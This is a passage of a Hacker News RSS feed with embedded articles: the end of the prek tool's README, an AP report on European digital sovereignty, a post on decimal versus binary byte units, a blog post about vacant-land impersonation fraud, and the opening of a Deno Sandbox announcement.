      &lt;item&gt;It redesigned how hook environments and toolchains are managed, they are all shared between hooks, which reduces the disk space usage and speeds up the installation process.&lt;/item&gt;
      &lt;item&gt;Repositories are cloned in parallel, and hooks are installed in parallel if their dependencies are disjoint.&lt;/item&gt;
      &lt;item&gt;Hooks can run in parallel by priority (hooks with the same &lt;code&gt;priority&lt;/code&gt;may run concurrently), reducing end-to-end runtime.&lt;/item&gt;
      &lt;item&gt;It uses &lt;code&gt;uv&lt;/code&gt;for creating Python virtualenvs and installing dependencies, which is known for its speed and efficiency.&lt;/item&gt;
      &lt;item&gt;It implements some common hooks in Rust, built in prek, which are faster than their Python counterparts.&lt;/item&gt;
      &lt;item&gt;It supports &lt;code&gt;repo: builtin&lt;/code&gt;for offline, zero-setup hooks, which is not available in&lt;code&gt;pre-commit&lt;/code&gt;.&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;No need to install Python or any other runtime, just download a single binary.&lt;/item&gt;
      &lt;item&gt;No hassle with your Python version or virtual environments, prek automatically installs the required Python version and creates a virtual environment for you.&lt;/item&gt;
      &lt;item&gt;Built-in support for workspaces (or monorepos), each subproject can have its own &lt;code&gt;.pre-commit-config.yaml&lt;/code&gt;file.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;prek run&lt;/code&gt;has some nifty improvements over&lt;code&gt;pre-commit run&lt;/code&gt;, such as:&lt;list rend="ul"&gt;&lt;item&gt;&lt;code&gt;prek run --directory &amp;lt;dir&amp;gt;&lt;/code&gt;runs hooks for files in the specified directory, no need to use&lt;code&gt;git ls-files -- &amp;lt;dir&amp;gt; | xargs pre-commit run --files&lt;/code&gt;anymore.&lt;/item&gt;&lt;item&gt;&lt;code&gt;prek run --last-commit&lt;/code&gt;runs hooks for files changed in the last commit.&lt;/item&gt;&lt;item&gt;&lt;code&gt;prek run [HOOK] [HOOK]&lt;/code&gt;selects and runs multiple hooks.&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;prek list&lt;/code&gt;command lists all available hooks, their ids, and descriptions, providing a better overview of the configured hooks.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;prek auto-update&lt;/code&gt;supports&lt;code&gt;--cooldown-days&lt;/code&gt;to mitigate open source supply chain attacks.&lt;/item&gt;
      &lt;item&gt;prek provides shell completions for &lt;code&gt;prek run &amp;lt;hook_id&amp;gt;&lt;/code&gt;command, making it easier to run specific hooks without remembering their ids.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;For more detailed improvements prek offers, take a look at Difference from pre-commit.&lt;/p&gt;
    &lt;p&gt;prek is pretty new, but it is already being used or recommend by some projects and organizations:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;apache/airflow&lt;/item&gt;
      &lt;item&gt;python/cpython&lt;/item&gt;
      &lt;item&gt;pdm-project/pdm&lt;/item&gt;
      &lt;item&gt;fastapi/fastapi&lt;/item&gt;
      &lt;item&gt;fastapi/typer&lt;/item&gt;
      &lt;item&gt;fastapi/asyncer&lt;/item&gt;
      &lt;item&gt;astral-sh/ruff&lt;/item&gt;
      &lt;item&gt;astral-sh/ty&lt;/item&gt;
      &lt;item&gt;openclaw/openclaw&lt;/item&gt;
      &lt;item&gt;home-assistant/core&lt;/item&gt;
      &lt;item&gt;DetachHead/basedpyright&lt;/item&gt;
      &lt;item&gt;OpenLineage/OpenLineage&lt;/item&gt;
      &lt;item&gt;authlib/authlib&lt;/item&gt;
      &lt;item&gt;django/djangoproject.com&lt;/item&gt;
      &lt;item&gt;Future-House/paper-qa&lt;/item&gt;
      &lt;item&gt;requests-cache/requests-cache&lt;/item&gt;
      &lt;item&gt;Goldziher/kreuzberg&lt;/item&gt;
      &lt;item&gt;python-attrs/attrs&lt;/item&gt;
      &lt;item&gt;jlowin/fastmcp&lt;/item&gt;
      &lt;item&gt;apache/iceberg-python&lt;/item&gt;
      &lt;item&gt;apache/lucene&lt;/item&gt;
      &lt;item&gt;jcrist/msgspec&lt;/item&gt;
      &lt;item&gt;python-humanize/humanize&lt;/item&gt;
      &lt;item&gt;MoonshotAI/kimi-cli&lt;/item&gt;
      &lt;item&gt;simple-icons/simple-icons&lt;/item&gt;
      &lt;item&gt;ast-grep/ast-grep&lt;/item&gt;
      &lt;item&gt;commitizen-tools/commitizen&lt;/item&gt;
      &lt;item&gt;cocoindex-io/cocoindex&lt;/item&gt;
      &lt;item&gt;cachix/devenv&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This project is heavily inspired by the original pre-commit tool, and it wouldn't be possible without the hard work of the maintainers and contributors of that project.&lt;/p&gt;
    &lt;p&gt;And a special thanks to the Astral team for their remarkable projects, particularly uv, from which I've learned a lot on how to write efficient and idiomatic Rust code.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46873138</guid><pubDate>Tue, 03 Feb 2026 16:29:34 +0000</pubDate></item><item><title>France dumps Zoom and Teams as Europe seeks digital autonomy from the US</title><link>https://apnews.com/article/europe-digital-sovereignty-big-tech-9f5388b68a0648514cebc8d92f682060</link><description>&lt;doc fingerprint="af50b110b70b4885"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;France dumps Zoom and Teams as Europe seeks digital autonomy from the US&lt;/head&gt;
    &lt;head rend="h2"&gt;France dumps Zoom and Teams as Europe seeks digital autonomy from the US&lt;/head&gt;
    &lt;p&gt;LONDON (AP) — In France, civil servants will ditch Zoom and Teams for a homegrown video conference system. Soldiers in Austria are using open source office software to write reports after the military dropped Microsoft Office. Bureaucrats in a German state have also turned to free software for their administrative work.&lt;/p&gt;
    &lt;p&gt;Around Europe, governments and institutions are seeking to reduce their use of digital services from U.S. Big Tech companies and turning to domestic or free alternatives. The push for “digital sovereignty” is gaining attention as the Trump administration strikes an increasingly belligerent posture toward the continent, highlighted by recent tensions over Greenland that intensified fears that Silicon Valley giants could be compelled to cut off access.&lt;/p&gt;
    &lt;p&gt;Concerns about data privacy and worries that Europe is not doing enough to keep up with the United States and Chinese tech leadership are also fueling the drive.&lt;/p&gt;
    &lt;p&gt;The French government referenced some of these concerns when it announced last week that 2.5 million civil servants would stop using video conference tools from U.S. providers — including Zoom, Microsoft Teams, Webex and GoTo Meeting — by 2027 and switch to Visio, a homegrown service.&lt;/p&gt;
    &lt;p&gt;The objective is “to put an end to the use of non-European solutions, to guarantee the security and confidentiality of public electronic communications by relying on a powerful and sovereign tool,” the announcement said.&lt;/p&gt;
    &lt;p&gt;“We cannot risk having our scientific exchanges, our sensitive data, and our strategic innovations exposed to non-European actors,” David Amiel, a civil service minister, said in a press release.&lt;/p&gt;
    &lt;p&gt;Microsoft said it continues to “partner closely with the government in France and respect the importance of security, privacy, and digital trust for public institutions.”&lt;/p&gt;
    &lt;p&gt;The company said it is “focused on providing customers with greater choice, stronger data protection, and resilient cloud services — ensuring data stays in Europe, under European law, with robust security and privacy protections.”&lt;/p&gt;
    &lt;p&gt;Zoom, Webex and GoTo Meeting did not respond to requests for comment.&lt;/p&gt;
    &lt;p&gt;French President Emmanuel Macron has been pushing digital sovereignty for years. But there’s now a lot more “political momentum behind this idea now that we need to de-risk from U.S. tech,” Nick Reiners, senior geotechnology analyst at the Eurasia Group.&lt;/p&gt;
    &lt;p&gt;“It feels kind of like there’s a real zeitgeist shift,” Reiners said&lt;/p&gt;
    &lt;p&gt;It was a hot topic at the World Economic Forum’s annual meeting of global political and business elites last month in Davos, Switzerland. The European Commission’s official for tech sovereignty, Henna Virkkunen, told an audience that Europe’s reliance on others “can be weaponized against us.”&lt;/p&gt;
    &lt;p&gt;“That’s why it’s so important that we are not dependent on one country or one company when it comes to very critical fields of our economy or society,” she said, without naming countries or companies.&lt;/p&gt;
    &lt;p&gt;A decisive moment came last year when the Trump administration sanctioned the International Criminal Court’s top prosecutor after the tribunal, based in The Hague, Netherlands, issued an arrest warrant for Israeli Prime Minister Benjamin Netanyahu, an ally of President Donald Trump.&lt;/p&gt;
    &lt;p&gt;The sanctions led Microsoft to cancel Khan’s ICC email, a move that was first reported by The Associated Press and sparked fears of a “kill switch” that Big Tech companies can use to turn off service at will.&lt;/p&gt;
    &lt;p&gt;Microsoft maintains it kept in touch with the ICC “throughout the process that resulted in the disconnection of its sanctioned official from Microsoft services. At no point did Microsoft cease or suspend its services to the ICC.”&lt;/p&gt;
    &lt;p&gt;Microsoft President Brad Smith has repeatedly sought to strengthen trans-Atlantic ties, the company’s press office said, and pointed to an interview he did last month with CNN in Davos in which he said that jobs, trade and investment. as well as security, would be affected by a rift over Greenland.&lt;/p&gt;
    &lt;p&gt;“Europe is the American tech sector’s biggest market after the United States itself. It all depends on trust. Trust requires dialogue,” Smith said.&lt;/p&gt;
    &lt;p&gt;Other incidents have added to the movement. There’s a growing sense that repeated EU efforts to rein in tech giants such as Google with blockbuster antitrust fines and sweeping digital rule books haven’t done much to curb their dominance.&lt;/p&gt;
    &lt;p&gt;Billionaire Elon Musk is also a factor. Officials worry about relying on his Starlink satellite internet system for communications in Ukraine.&lt;/p&gt;
    &lt;p&gt;Washington and Brussels wrangled for years over data transfer agreements, triggered by former National Security Agency contractor Edward Snowden’s revelations of U.S. cyber-snooping.&lt;/p&gt;
    &lt;p&gt;With online services now mainly hosted in the cloud through data centers, Europeans fear that their data is vulnerable.&lt;/p&gt;
    &lt;p&gt;U.S. cloud providers have responded by setting up so-called “sovereign cloud” operations, with data centers located in European countries, owned by European entities and with physical and remote access only for staff who are European Union residents.&lt;/p&gt;
    &lt;p&gt;The idea is that “only Europeans can take decisions so that they can’t be coerced by the U.S.,” Reiners said.&lt;/p&gt;
    &lt;p&gt;The German state of Schleswig-Holstein last year migrated 44,000 employee inboxes from Microsoft to an open source email program. It also switched from Microsoft’s SharePoint file sharing system to Nextcloud, an open source platform, and is even considering replacing Windows with Linux and telephones and videoconferencing with open source systems.&lt;/p&gt;
    &lt;p&gt;“We want to become independent of large tech companies and ensure digital sovereignty,” Digitalization Minister Dirk Schrödter said in an October announcement.&lt;/p&gt;
    &lt;p&gt;The French city of Lyon said last year that it’s deploying free office software to replace Microsoft. Denmark’s government and the cities of Copenhagen and Aarhus have also been trying out open-source software.&lt;/p&gt;
    &lt;p&gt;“We must never make ourselves so dependent on so few that we can no longer act freely,” Digital Minister Caroline Stage Olsen wrote on LinkedIn last year. “Too much public digital infrastructure is currently tied up with very few foreign suppliers.”&lt;/p&gt;
    &lt;p&gt;The Austrian military said it has also switched to LibreOffice, a software package with word processor, spreadsheet and presentation programs that mirrors Microsoft 365’s Word, Excel and PowerPoint.&lt;/p&gt;
    &lt;p&gt;The Document Foundation, a nonprofit based in Germany that’s behind LibreOffice, said the military’s switch “reflects a growing demand for independence from single vendors.” Reports also said the military was concerned that Microsoft was moving file storage online to the cloud — the standard version of LibreOffice is not cloud-based.&lt;/p&gt;
    &lt;p&gt;Some Italian cities and regions adopted the software years ago, said Italo Vignoli, a spokesman for The Document Foundation. Back then, the appeal was not needing to pay for software licenses. Now, it’s the main reason is to avoid being locked into a proprietary system.&lt;/p&gt;
    &lt;p&gt;“At first, it was: we will save money and by the way, we will get freedom,” Vignoli said. “Today it is: we will be free and by the way, we will also save some money.”&lt;/p&gt;
    &lt;p&gt;___&lt;/p&gt;
    &lt;p&gt;Associated Press writer Molly Quell in The Hague, Netherlands contributed to this report.&lt;/p&gt;
    &lt;p&gt;___&lt;/p&gt;
    &lt;p&gt;This version corrects the contribution line to Molly Quell instead of Molly Hague.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46873294</guid><pubDate>Tue, 03 Feb 2026 16:39:18 +0000</pubDate></item><item><title>1 kilobyte is precisely 1000 bytes?</title><link>https://waspdev.com/articles/2026-01-11/kilobyte-is-1000-bytes</link><description>&lt;doc fingerprint="3b2134c2f49f1add"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;1 kilobyte is precisely 1000 bytes&lt;/head&gt;
    &lt;p&gt; Published on &lt;lb/&gt;Updated on &lt;/p&gt;
    &lt;p&gt;When it comes to computer memory, we usually learn that a kilobyte is 1024 bytes, a megabyte is 1024 kilobytes, and so on. But what if I told you that it's not necessarily true and 1 kilobyte can be 1000 bytes? And what's more, this makes even more sense.&lt;/p&gt;
    &lt;head rend="h2"&gt;Why do we often say 1 kilobyte = 1024 bytes?&lt;/head&gt;
    &lt;p&gt;Since computers work in a binary system (base 2), the memory is also addressed in binary. This means it's quite impractical to use memory addresses or produce RAM sticks with memory amounts that are not multiples of powers of 2. From the powers of 2 we chose 1024 (210) as the base order of magnitude, since it's very close to 1000 (2.4% difference) and it's not insanely large. So, in practice we often consider kilo as 1024 (210), mega as 1048576 (220), giga as 1073741824 (230), etc.&lt;/p&gt;
    &lt;head rend="h2"&gt;Why does 1000 still make more sense?&lt;/head&gt;
    &lt;p&gt;While binary kilo, mega and giga units are close to their decimal counterparts, some might already notice that the larger are the units, the more is the proportional inaccuracy. In order to illustrate, let's increase the units:&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="4"&gt;
        &lt;cell role="head"&gt;Unit&lt;/cell&gt;
        &lt;cell role="head"&gt;Decimal value&lt;/cell&gt;
        &lt;cell role="head"&gt;Binary value&lt;/cell&gt;
        &lt;cell role="head"&gt;Relative difference&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;Kilo&lt;/cell&gt;
        &lt;cell&gt;1000&lt;/cell&gt;
        &lt;cell&gt;1024&lt;/cell&gt;
        &lt;cell&gt;2.4%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;Mega&lt;/cell&gt;
        &lt;cell&gt;1000000&lt;/cell&gt;
        &lt;cell&gt;1048576&lt;/cell&gt;
        &lt;cell&gt;≈ 4.8%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;Giga&lt;/cell&gt;
        &lt;cell&gt;1000000000&lt;/cell&gt;
        &lt;cell&gt;1073741824&lt;/cell&gt;
        &lt;cell&gt;≈ 7.3%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;Tera&lt;/cell&gt;
        &lt;cell&gt;1000000000000&lt;/cell&gt;
        &lt;cell&gt;1099511627776&lt;/cell&gt;
        &lt;cell&gt;≈ 10%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;Peta&lt;/cell&gt;
        &lt;cell&gt;1015&lt;/cell&gt;
        &lt;cell&gt;~ 1.126 * 1015&lt;/cell&gt;
        &lt;cell&gt;≈ 12.6%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;Exa&lt;/cell&gt;
        &lt;cell&gt;1018&lt;/cell&gt;
        &lt;cell&gt;~ 1.153 * 1018&lt;/cell&gt;
        &lt;cell&gt;≈ 15.3%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;Zetta&lt;/cell&gt;
        &lt;cell&gt;1021&lt;/cell&gt;
        &lt;cell&gt;~ 1.181 * 1021&lt;/cell&gt;
        &lt;cell&gt;≈ 18.1%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;Yotta&lt;/cell&gt;
        &lt;cell&gt;1024&lt;/cell&gt;
        &lt;cell&gt;~ 1.209 * 1024&lt;/cell&gt;
        &lt;cell&gt;≈ 20.9%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;Ronna&lt;/cell&gt;
        &lt;cell&gt;1027&lt;/cell&gt;
        &lt;cell&gt;~ 1.238 * 1027&lt;/cell&gt;
        &lt;cell&gt;≈ 23.8%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Quetta&lt;/cell&gt;
        &lt;cell&gt;1030&lt;/cell&gt;
        &lt;cell&gt;~ 1.268 * 1030&lt;/cell&gt;
        &lt;cell&gt;≈ 26.8%&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;For 1 quettabyte the inaccuracy is already larger than a quarter. Even for 1 terabyte the difference is noticeable, around 10%. This problem often happens when hardware manufacturers (such as HDD or SSD) advertise the memory capacity in decimal units while the operating system might show in binary units.&lt;/p&gt;
    &lt;p&gt;For smaller amounts of memory the binary representation is pretty close to the decimal one, but diverges for huge amounts of memory.&lt;/p&gt;
    &lt;head rend="h3"&gt;What are the standard units?&lt;/head&gt;
    &lt;p&gt;This "kilobyte = 1024 bytes" rule is actually an old (often confusing) convention. In the tech industry there is still huge inertia, this old convention is still used by RAM manufacturers (JEDEC), tons of software and some operating systems (such as Windows). Interestingly, storage vendors often prefer the decimal convention, which creates even more confusion (mentioned above).&lt;/p&gt;
    &lt;p&gt;In order to solve this confusion, International Electrotechnical Commission introduced binary prefixes for binary units:&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="4"&gt;
        &lt;cell role="head"&gt;Binary units (International Electrotechnical Commission)&lt;/cell&gt;
        &lt;cell role="head"&gt;Decimal units (International System of Units)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;Unit&lt;/cell&gt;
        &lt;cell&gt;Value&lt;/cell&gt;
        &lt;cell&gt;Unit&lt;/cell&gt;
        &lt;cell&gt;Value&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;KiB (kibibyte)&lt;/cell&gt;
        &lt;cell&gt;10241&lt;/cell&gt;
        &lt;cell&gt;kB (kilobyte)&lt;/cell&gt;
        &lt;cell&gt;10001&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;MiB (mebibyte)&lt;/cell&gt;
        &lt;cell&gt;10242&lt;/cell&gt;
        &lt;cell&gt;MB (megabyte)&lt;/cell&gt;
        &lt;cell&gt;10002&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;GiB (gibibyte)&lt;/cell&gt;
        &lt;cell&gt;10243&lt;/cell&gt;
        &lt;cell&gt;GB (gigabyte)&lt;/cell&gt;
        &lt;cell&gt;10003&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;TiB (tebibyte)&lt;/cell&gt;
        &lt;cell&gt;10244&lt;/cell&gt;
        &lt;cell&gt;TB (terabyte)&lt;/cell&gt;
        &lt;cell&gt;10004&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;PiB (pebibyte)&lt;/cell&gt;
        &lt;cell&gt;10245&lt;/cell&gt;
        &lt;cell&gt;PB (petabyte)&lt;/cell&gt;
        &lt;cell&gt;10005&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;EiB (exbibyte)&lt;/cell&gt;
        &lt;cell&gt;10246&lt;/cell&gt;
        &lt;cell&gt;EB (exabyte)&lt;/cell&gt;
        &lt;cell&gt;10006&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;ZiB (zebibyte)&lt;/cell&gt;
        &lt;cell&gt;10247&lt;/cell&gt;
        &lt;cell&gt;ZB (zettabyte)&lt;/cell&gt;
        &lt;cell&gt;10007&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;YiB (yobibyte)&lt;/cell&gt;
        &lt;cell&gt;10248&lt;/cell&gt;
        &lt;cell&gt;YB (yottabyte)&lt;/cell&gt;
        &lt;cell&gt;10008&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;RiB (robibyte)&lt;/cell&gt;
        &lt;cell&gt;10249&lt;/cell&gt;
        &lt;cell&gt;RB (ronnabyte)&lt;/cell&gt;
        &lt;cell&gt;10009&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;QiB (quebibyte)&lt;/cell&gt;
        &lt;cell&gt;102410&lt;/cell&gt;
        &lt;cell&gt;QB (quettabyte)&lt;/cell&gt;
        &lt;cell&gt;100010&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;The guidance is: SI prefixes are powers of 10 only, and if you mean powers of 2 you should use IEC binary prefixes (Ki, Mi, Gi, …).&lt;/p&gt;
    &lt;head rend="h2"&gt;Conclusion&lt;/head&gt;
    &lt;p&gt;There is still a lot of inertia to equate 1 kilobyte to 1024 bytes. While this is usually acceptable depending on the context, it can sometimes cause confusion, especially for non-technical people.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46873539</guid><pubDate>Tue, 03 Feb 2026 16:53:50 +0000</pubDate></item><item><title>221 Cannon is Not For Sale</title><link>https://fredbenenson.com/blog/2026/02/03/221-cannon-is-not-for-sale/</link><description>&lt;doc fingerprint="ec0da09223e19cd5"&gt;
  &lt;main&gt;
    &lt;p&gt;Like most people, I’ve had my identity stolen once or twice in my life. It’s annoying, but thankfully I’ve avoided some of the more catastrophic outcomes when criminals begin impersonating you.&lt;/p&gt;
    &lt;p&gt;These days, however, it seems like someone is really trying to change that: a scammer has now tried to impersonate me multiple times in a six figure land deal in my hometown of Wilton, CT. So while I usually use this blog to write about finding weird things on the internet, it’s now time for a story about something weird on the internet finding me.&lt;/p&gt;
    &lt;p&gt;The story begins with my brother Alexander and I purchasing a small parcel of vacant land at 221 Cannon Road in Wilton, Connecticut in 2015. It’s been over 10 years since we purchased it and we have never listed it for sale. Nor do we have plans to sell it.&lt;/p&gt;
    &lt;p&gt;And yet, three different real estate agents have now contacted us to let us know that someone has been impersonating us and attempting to sell our property out from under us.&lt;/p&gt;
    &lt;p&gt;The first time it happened, it was pretty upsetting, but now that it’s happened another two times, I figured it was time to write a blog post about it.&lt;/p&gt;
    &lt;head rend="h2"&gt;The First Attempt (March 2024)&lt;/head&gt;
    &lt;p&gt;In March 2024, I received an email from a real estate attorney in Wilton, asking if I was the “Fred Benenson” who co-owned property in town with an “Ed Benenson.” He explained that a realtor at a major brokerage had been working with someone claiming to be us, and that there was already an offer on the table. The attorney was doing his due diligence before representing the sellers — and something didn’t add up.&lt;/p&gt;
    &lt;p&gt;I replied within minutes: Neither of us had spoken to anyone about selling the property. It was pretty concerning.&lt;/p&gt;
    &lt;p&gt;The realtor had been contacted through Zillow by someone claiming to be me. They’d had a phone conversation — she noted the person had a “middle European” accent — and the scammer had provided accurate details about the property, including its exact acreage. The impostor gave her the email address &lt;code&gt;[email protected]&lt;/code&gt; and the phone number (516) 828-0305. He also provided a fake email for my brother: &lt;code&gt;[email protected]&lt;/code&gt;. Notice the subtle misspelling — “Benenson” without the second “n” in the email, and the hyphenated “out-look.com” domain.&lt;/p&gt;
    &lt;p&gt;She had walked the property, taken drone photos, pulled comps, and listed for a price well above what we paid for it. The property had been live on dozens of real estate websites for days before anyone caught it. A builder had already submitted a full-price cash offer.&lt;/p&gt;
    &lt;p&gt;The scammer had even e-signed a purchase agreement.&lt;/p&gt;
    &lt;p&gt;When the attorney requested identification before closing, the impostor provided a New York State driver’s license. It had my father’s name (which I share with him) and his correct date of birth and home address. But the photo was of a complete stranger.&lt;/p&gt;
    &lt;p&gt;I have no idea who that guy is in on the license, but it’s definitely not my Dad. The license wouldn’t fool anyone who knew my father, but it didn’t need to – in a transaction conducted entirely by email and text message, with a closing that the scammer would never actually attend, the ID just needed to look plausible enough to keep things moving forward. (Though if you look closely at his signature, it’s clearly not written by hand.)&lt;/p&gt;
    &lt;head rend="h2"&gt;How It Was Caught&lt;/head&gt;
    &lt;p&gt;The attorney deserves most of the credit here. He told me this was the second time in nine months he’d encountered this exact scheme on vacant land in Wilton – his policy is that he won’t represent owners of vacant land without independently verifying ownership. That’s what led him to track me down, and that’s what stopped the sale.&lt;/p&gt;
    &lt;p&gt;The realtor was an innocent victim in this too. She’d done her job by walking the property, pulling comps, etc., all in good faith. When I initially suggested (perhaps unfairly) that this felt like lead generation, the attorney took me aside and vouched for her. I’m glad I listened to him!&lt;/p&gt;
    &lt;p&gt;I apologized to her, and she graciously forwarded me all of her text message exchanges with the scammer. Reading through them was fascinating. The impostor was responsive, polite, and generally knew the right things to say. But there were tells: slightly awkward phrasing (“Hi good morning”), declining a for-sale sign (“No I don’t think that will be necessary”), and a general reluctance to engage in any way that might require showing up in person.&lt;/p&gt;
    &lt;head rend="h2"&gt;Going to the FBI&lt;/head&gt;
    &lt;p&gt;After gathering everything I could — the fake ID, the realtor’s text messages, the scammer’s email addresses and phone number, and the attorney’s notes from a prior similar case — I contacted the FBI field office in Connecticut. They directed me to “walk it in” to the office in New York City.&lt;/p&gt;
    &lt;p&gt;The experience was, frankly, underwhelming. The FBI wouldn’t let me submit any of our documentation. Instead, they required me to write out the entire complaint by hand on a single piece of paper and hand it to the guard. He made some calls while I waited, and by the end he seemed at least somewhat interested. He gave me the standard line: 2-3 weeks if I hear from anyone.&lt;/p&gt;
    &lt;p&gt;I never heard from anyone.&lt;/p&gt;
    &lt;p&gt;The attorney, meanwhile, checked with his title company about recording an affidavit on the land records — something that would alert any future buyer or title searcher that the property had been targeted by fraud, and providing our verified contact information.&lt;/p&gt;
    &lt;head rend="h2"&gt;It’s Happening Again (February 2026)&lt;/head&gt;
    &lt;p&gt;I thought this was behind us. Then, this past week, nearly two years later, I was contacted by two more real estate agents, both reaching out to warn me that someone was once again trying to sell 221 Cannon Road.&lt;/p&gt;
    &lt;p&gt;The first was a agent in Wilton who reached out via Instagram DM, of all places — it was the only way he could find to contact me. He explained that his team had received an inquiry to list 221 Cannon Road and had sent paperwork to “Fred and Alex” the night before to sign. But he’d done something smart: he’d noticed he had a mutual friend with my brother, and when he asked him about the situation, he flagged that the conversation with “Alex” didn’t sound right.&lt;/p&gt;
    &lt;p&gt;“I had a really bad feeling it wasn’t,” he told me.&lt;/p&gt;
    &lt;p&gt;The second agent, a woman at Berkshire Hathaway, sent a carefully worded email explaining that she’d been contacted by someone claiming to have authority to sell our property, but that “several standard verification steps raised concerns” and she chose not to proceed. She reached out purely as a courtesy to let us know.&lt;/p&gt;
    &lt;p&gt;Which is about when I decided I should write something about this. Not only because it’s a fascinating scam that seems to be getting more common, but because I figured this post might show up for the next broker who might be doing research on the address.&lt;/p&gt;
    &lt;head rend="h2"&gt;Vacant Land Fraud&lt;/head&gt;
    &lt;p&gt;This type of scam targets a very specific vulnerability: vacant land has no occupants to notice a for-sale sign, no neighbors who’d immediately recognize something is wrong, and closings often happen remotely.&lt;/p&gt;
    &lt;p&gt;Here’s how it works:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;The scammer identifies vacant land through public records or Zillow. They look for parcels that are owned free and clear (no mortgage), haven’t changed hands recently, and are in desirable areas.&lt;/item&gt;
      &lt;item&gt;They contact a real estate agent through a platform like Zillow, posing as the owner. They know the property details because that information is publicly available.&lt;/item&gt;
      &lt;item&gt;They communicate primarily through text and email, avoiding in-person meetings. They provide fake identification if asked.&lt;/item&gt;
      &lt;item&gt;They agree to whatever price the agent suggests (because they don’t actually own the property, any sale is pure profit).&lt;/item&gt;
      &lt;item&gt;They push for a quick closing and attempt to direct proceeds to an account they control.&lt;/item&gt;
      &lt;item&gt;If questioned, they disappear. The scammer who targeted us in 2024 simply stopped responding once the attorney asked for an in-person closing.&lt;/item&gt;
      &lt;item&gt;If they get farther they’ll pocket the earnest money deposit which would have been significant in my case.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;A similar scheme in nearby Fairfield wasn’t caught in time: someone had a $1.5 million home built on land they didn’t own without the actual owners knowing.&lt;/p&gt;
    &lt;head rend="h2"&gt;What You Can Do&lt;/head&gt;
    &lt;p&gt;If you own vacant land there are a couple of things you can do, but the most effective one is probably to register the address with a Fraud / No-Authority notice. This involves calling the County Recorder / Register of Deeds and ask how to record one of these (names vary by state):&lt;lb/&gt; • Owner Affidavit&lt;lb/&gt; • Affidavit of Fact&lt;lb/&gt; • Notice of Non-Authority to Convey&lt;lb/&gt; • Fraud Alert / Title Alert Notice&lt;lb/&gt; • Statement of Ownership / Anti-Fraud Notice:&lt;/p&gt;
    &lt;p&gt;You could also setup up Google Alerts for your address and you’ll be notified if it appears online.&lt;/p&gt;
    &lt;p&gt;Finally, and this certainly isn’t for everyone, you can make yourself easily findable online. One reason the attorney was able to verify ownership quickly in 2024 was that it’s fairly easy to gooogle me. If you own property, make sure there’s some way for a diligent attorney or agent to reach the real you.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Property Is Not For Sale&lt;/head&gt;
    &lt;p&gt;In case it isn’t clear, 221 Cannon Road is not for sale. It has never been for sale. If you are a real estate professional who has been contacted about listing or purchasing this property, please reach out to me directly.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46873574</guid><pubDate>Tue, 03 Feb 2026 16:56:06 +0000</pubDate></item><item><title>Deno Sandbox</title><link>https://deno.com/blog/introducing-deno-sandbox</link><description>&lt;doc fingerprint="84be1f18cd2fafa2"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Introducing Deno Sandbox&lt;/head&gt;
    &lt;p&gt;Over the past year, we’ve seen a shift in what Deno Deploy customers are building: platforms where users generate code with LLMs, and that code runs immediately without review. That code frequently calls LLMs itself, which means it needs API keys and network access.&lt;/p&gt;
